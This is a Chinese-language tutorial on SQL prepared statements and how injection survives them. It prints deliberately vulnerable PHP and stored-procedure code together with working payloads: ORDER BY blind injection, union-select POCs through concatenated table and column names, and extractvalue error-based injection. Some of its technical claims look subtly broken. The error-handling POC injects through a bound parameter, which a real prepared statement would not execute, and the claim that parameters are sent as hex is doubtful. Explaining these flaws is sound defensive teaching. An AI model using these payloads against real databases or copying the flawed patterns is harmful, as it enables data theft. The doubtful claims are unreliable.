---
title: SQL 预编译及绕过
date: 2026-08-28 13:35:00
categories:
  - Web安全
tags:
  - SQL注入
  - 预编译
description: 预编译防御原理与绕过方法详解
---

[预编译与sql注入，正则回溯绕过，mysql常见绕过，报错注入7大常用函数 - 技术栈](https://jishuzhan.net/article/2015601496755847169)

## 预编译的基础原理与作用
### 1. 为什么预编译能防御SQL注入？
假设有一个使用SQL预编译的查询语句：

```sql
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet rs = pstmt.executeQuery();
```

在这个示例中，查询语句中的参数使用了占位符，即“?”号，而不是将参数直接拼接到SQL语句中。这可以有效地防止SQL注入攻击。



SQL注入的核心原因在于：数据库将用户的输入当成了可执行的SQL代码的一部分。

普通查询：直接拼接字符串。如果用户输入 `1 union select...`，数据库会将其解析为两条指令。

预编译：将SQL语句的结构与数据分离。

1. 预处理：数据库先接收带有占位符（如 `?`）的SQL模板，进行语法检查、解析并生成执行计划（语法树）。此时数据库已经确定了"这句话是干什么用的"（例如查询id为X的用户）。
2. 执行：用户输入的数据作为纯数据填充到占位符中。无论输入什么内容，数据库都只把它当作数据，而不会改变之前生成的SQL结构。

结论：预编译消除了SQL语句的歧义。

### 2. 预编译的初衷是什么？
预编译最初的目的是为了"性能优化"，而不是为了安全。

如果大量执行相同的SQL语句，预编译可以复用执行计划（语法树），避免重复解析，提高效率。

防御SQL注入只是其副产品。

## "真"预编译与"假"预编译（PHP PDO为例）
强调一个在渗透测试和代码审计中非常重要的概念："模拟预编译"。

> **PHP PDO（PHP Data Objects）** 是一种轻量级的数据库抽象层，为开发者提供了统一的接口来访问多种数据库。通过 PDO，开发者可以在不修改代码逻辑的情况下切换数据库类型，例如 MySQL、PostgreSQL、SQLite 等。
>

### 1. 虚假的预编译
**机制**：当使用PHP PDO时，默认配置 `PDO::ATTR_EMULATE_PREPARES`为 `true`。

**过程**：程序并没有真正将SQL模板发给数据库。而是在本地（客户端）将参数值进行转义（自动加引号、转义符号），然后拼接成完整的SQL语句，再发给数据库执行。

**日志特征**：数据库日志中只看到 `Query`语句，没有 `Prepare`和 `Execute` 的分步过程。

**风险**：本质上只是做了自动转义，和`addslashes`类似。

> addslashes 是 PHP 中的一个函数，用于在字符串中的预定义字符前添加反斜杠。这些预定义字符包括单引号 (')、双引号 (")、反斜杠 (\) 和 NULL 字符。
>

**宽字节注入**：在特定编码（如GBK）环境下，理论上可能通过构造字符吞掉转义符（`\`）来实现注入。

安全性不如真预编译。

### 2. 真正的预编译
**机制**：设置 `PDO::ATTR_EMULATE_PREPARES` 为 `false`。

**过程**：

1. 客户端发送带 `?`的模板给DB -> `Prepare`。
2. DB解析并构建语法树。
3. 客户端发送参数值给DB -> `Execute`。

**日志特征**：日志清晰显示 `Prepare` 和 `Execute` 分开执行。

**安全性**：参数值在底层被转为十六进制（Hex）发送，彻底隔绝了SQL注入的可能性（仅限可参数化位置）

## 预编译的注入点：不可参数化的位置
预编译只能防御数据值的注入，无法防御结构位置的注入。

### 1. 哪些位置不可参数化？
由于数据库的设计，预编译绑定参数时，必须会给参数加上单引号，且参数被视为数据值。但以下位置必须要是"裸"的（**不带引号**），否则SQL语法错误或逻辑错误：

+ 表名
+ 列名
+ Order By / Group By 后的字段
+ Limit 后的数字
+ Join 条件

### 2. 为什么 Order By 不可预编译？
如果强行使用预编译，SQL会变成 `SELECT * FROM table ORDER BY 'column_name'`。

加上引号后，数据库将其视为一个"字符串常量"，而不是列名。这会导致排序失效（等同于 `ORDER BY NULL`或随机排序）。

因此，开发者不得不使用字符串拼接 `ORDER BY $col`，这就导致了SQL注入漏洞。

### 3. 如何利用 Order By 进行盲注？
如果遇到 `Order By` 后可控，可以利用**报错注入**或**布尔盲注**。

**布尔盲注原理**：利用 `ORDER BY` 配合条件判断，不同的真值会导致排序结果不同。

Payload示例：

```sql
SELECT * FROM users ORDER BY rand(ascii(mid((select database()),1,1))>96)
```

如果 `>96` 为真，`rand(1)` 是一个固定值；如果为假，`rand(0)` 是另一个固定值。观察返回结果的行顺序变化即可以此一位位猜解数据。

## 深入底层：为什么无法设计"安全预编译"？
无法简单地通过修改代码来让所有位置都支持预编译。

### 1. 性能与执行计划
数据库优化器在生成执行计划时，需要知道具体的表名、列名才能决定使用哪个索引。

`WHERE username = ?` 无论填什么值，执行计划可能是一样的（比如用username的索引）。

`ORDER BY ?` 如果 ? 是 id 用索引A，如果是 create_time 用索引B。参数会影响结构，导致无法复用预编译的执行计划。

### 2. 协议层面的真相
通过抓包分析 Web 服务与数据库的二进制协议通信，发现：

预编译的**参数**在传输时并不是带着"**引号**"过去的，而是通过二进制协议的**类型标识**来区分是整数还是字符串。

数据库日志里显示的引号，是 MySQL 为了日志可读性自己加的显示格式。

既然是数据库底层协议规定了占位符只能传数据，那么应用层（PHP/Java/Go）无法单方面改变这个限制。

所以说，有的引号就是加不了，所以不保证所有的预编译都是安全的

## 终极绕过：协议层SQL注入
![](/img/yuque-sql.png)

### 1. 预编译防御的边界
预编译解决了"代码与数据混淆"的问题，也就是解决了 **Web服务 -> 数据库** 这个过程中，用户输入被错误解析为SQL代码的问题。

但是，预编译没有解决 **Web服务 -> 数据库** 这个通信过程本身被篡改的问题。

### 2. 二进制协议溢出攻击 (CVE-2024-27304)
**原理**：

Web服务构造数据库协议包：`_Type_:_Execute_ _Length_:4字节 _Value_:_SQL_数据`。

`Length` 字段（4字节）最大支持 `0xFFFFFFFF` (4GB)。

如果攻击者发送一个超长的输入（或者利用某些压缩特性），导致 Length 计算发生"**整数溢出**"。

例如溢出后 Length 变成了 0 或一个很小的值。

数据库解析时，只读取了很小的长度作为 SQL 语句，而原本后面的数据被"截断"在协议流中。

**攻击效果**：

攻击者精心构造输入，使得截断后剩下的二进制数据恰好组成了一个新的、合法的协议包（例如 `Query: DROP TABLE users`）。

数据库继续读取流，执行了这个被"走私"进来的恶意SQL语句。

结论：这种攻击完全无视应用层是否使用了预编译，因为它发生在**协议解析层面**。

## 一句话总结：预编译会消除sql注入误解但是无法消除注入本身，注入的语句本身依旧会在web服务->数据库 阶段执行，可通过底层二进制协议溢出的方式走私恶意代码
> 注：在 Windows 中文系统下，PHP 通过命令行执行命令成功但没有正确回显输出，核心原因可能是字符编码不匹配（Windows 默认是 GBK/GB2312，而 PHP 默认用 UTF-8）导致的乱码或无输出。
>
> 解决方法：
>
> **核心原因** ：
>
> Windows 中文系统命令行输出是 GBK 编码，PHP 默认 UTF-8，编码不匹配导致无回显 / 乱码；
>
> **快速解决** ：执行命令前加`chcp 936`，并将输出用`mb_convert_encoding`转为 UTF-8；
>
> **全局解决** ：修改`php.ini`配置开启 mbstring 扩展，设置默认编码为 UTF-8。
>

## SQL预编译的绕过方法！！！！！
### **字符串拼接**：
如果在SQL预编译语句中使用了字符串拼接，攻击者可以通过构造特定的字符串来绕过预编译过程。

漏洞代码 :

```sql
<?php
// 看似用了预编译，但表名/列名直接拼接了
$id = $_GET['id'];
$table = $_GET['table'];  // 用户可控的表名

$pdo = new PDO("mysql:host=localhost;dbname=test", "root", "root");

// ❌ 错误：表名直接拼接，预编译只防了 id 的值
$sql = "SELECT * FROM $table WHERE id = ?";
$stmt = $pdo->prepare($sql);
$stmt->execute([$id]);

$result = $stmt->fetchAll();
print_r($result);
?>
```

POC :

```sql
?id=1&table=users where 1=2 union select 1,version(),3--+
```

### **动态拼接SQL语句**：
如果动态地拼接SQL语句，例如使用字符串拼接、字符串格式化等方式，攻击者同样可以利用字符串的特性来绕过预编译过程。

漏洞代码 :

```sql
<?php
// 用字符串格式化动态生成整个 SQL
$id = $_GET['id'];
$column = $_GET['column'];  // 用户可控的列名

$pdo = new PDO("mysql:host=localhost;dbname=test", "root", "root");

// ❌ 错误：列名用 sprintf 拼进去了
$sql = sprintf("SELECT %s FROM users WHERE id = ?", $column);
$stmt = $pdo->prepare($sql);
$stmt->execute([$id]);

$result = $stmt->fetchAll();
print_r($result);
?>
```

POC:

```sql
?id=1&column=version() from users where 1=2 union select flag--+
```

### 函数 / 存储过程绕过:
如果在SQL语句中使用了函数或存储过程，攻击者可以构造恶意的输入，使其执行预期之外的操作，绕过预编译过程。

```sql
-- 创建存储过程
DELIMITER //
CREATE PROCEDURE getUser(IN username VARCHAR(50))
BEGIN
    -- ❌ 存储过程内部直接拼接，存在注入
    SET @sql = CONCAT('SELECT * FROM users WHERE username = ''', username, '''');
    PREPARE stmt FROM @sql;
    EXECUTE stmt;
    DEALLOCATE PREPARE stmt;
END //
DELIMITER ;
```

```sql
<?php
// PHP 端看似用了预编译调用存储过程
$user = $_GET['user'];

$pdo = new PDO("mysql:host=localhost;dbname=test", "root", "root");

// ✅ PHP 端用了预编译
$stmt = $pdo->prepare("CALL getUser(?)");
$stmt->execute([$user]);

$result = $stmt->fetchAll();
print_r($result);
?>
```

POC：

```sql
?user=admin' AND extractvalue(1,concat(0x7e,version(),0x7e)) AND '1'='1
```

### **错误处理不当**：
如果SQL预编译过程中的错误处理不当，例如忽略异常或者异常处理不当，攻击者可能会通过特定的输入来触发错误，绕过预编译过程。

漏洞代码：

```sql
<?php
$id = $_GET['id'];

$pdo = new PDO("mysql:host=localhost;dbname=test", "root", "root");
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

try {
    $sql = "SELECT * FROM users WHERE id = ?";
    $stmt = $pdo->prepare($sql);
    $stmt->execute([$id]);
} catch (Exception $e) {
    // ❌ 错误：直接把异常信息输出到页面
    echo "错误：" . $e->getMessage();
}
?>
```

POC（报错注入）:

```sql
?id=1 AND extractvalue(1,concat(0x7e,version(),0x7e))
```

## 一句话总结:**预编译只防 "值" 的注入，不防 "结构" 的注入。只要 SQL 模板本身是用户可控的（表名、列名、ORDER BY、存储过程内部拼接），预编译就形同虚设。**
